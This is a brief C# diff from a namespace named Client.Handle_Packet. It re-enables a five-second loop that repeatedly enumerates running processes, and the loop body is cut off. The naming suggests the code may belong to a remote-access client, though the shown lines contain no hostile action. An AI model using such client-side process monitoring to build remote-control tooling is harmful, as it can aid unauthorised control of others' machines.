@@ -65,7 +65,7 @@ namespace Client.Handle_Packet
 
                     Stopwatch stopwatch = new Stopwatch();
                     stopwatch.Start();
-                //    while (stopwatch.Elapsed < TimeSpan.FromSeconds(5))
+                    while (stopwatch.Elapsed < TimeSpan.FromSeconds(5))
                     {
                         Thread.Sleep(1);
                         foreach (Process p in Process.GetProcesses())
